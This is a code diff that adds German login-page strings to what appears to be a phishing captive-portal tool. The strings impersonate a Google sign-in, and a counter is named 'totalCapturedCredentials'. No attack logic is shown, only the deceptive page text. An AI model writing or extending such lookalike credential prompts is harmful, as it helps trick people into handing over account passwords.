@@ -19,6 +19,7 @@
 #define LOGIN_BUTTON "Next"
 #define LOGIN_AFTER_MESSAGE "Please wait a few minutes. Soon you will be able to access the internet."
 #define TYPE_SSID_TEXT "SSID length should be between 2 and 32\nInvalid: ?,$,\",[,\\,],+\n\nType the SSID\nPress Enter to Confirm\n\n"
+
 #elif defined(LANGUAGE_PT_BR)
 #define LOGIN_TITLE "Fazer login"
 #define LOGIN_SUBTITLE "Use sua Conta do Google"
@@ -28,6 +29,16 @@
 #define LOGIN_BUTTON "Avançar"
 #define LOGIN_AFTER_MESSAGE "Fazendo login..."
 #define TYPE_SSID_TEXT "Tamanho entre 2 e 32\nInvalidos: ?,$,\",[,\\,],+\n\nDigite o SSID\nEnter para Confirmar\n\n"
+
+#elif defined(LANGUAGE_GER)
+#define LOGIN_TITLE "Willkommen"
+#define LOGIN_SUBTITLE "mit Google anmelden"
+#define LOGIN_EMAIL_PLACEHOLDER "E-mail oder Telefonnummer"
+#define LOGIN_PASSWORD_PLACEHOLDER "Passwort eingeben"
+#define LOGIN_MESSAGE "Please log in to browse securely."
+#define LOGIN_BUTTON "Weiter"
+#define LOGIN_AFTER_MESSAGE "Daten werden geprüft..."
+#define TYPE_SSID_TEXT "SSID length should be between 2 and 32\nInvalid: ?,$,\",[,\\,],+\n\nType the SSID\nPress Enter to Confirm\n\n"
 #endif
 
 int totalCapturedCredentials = 0;
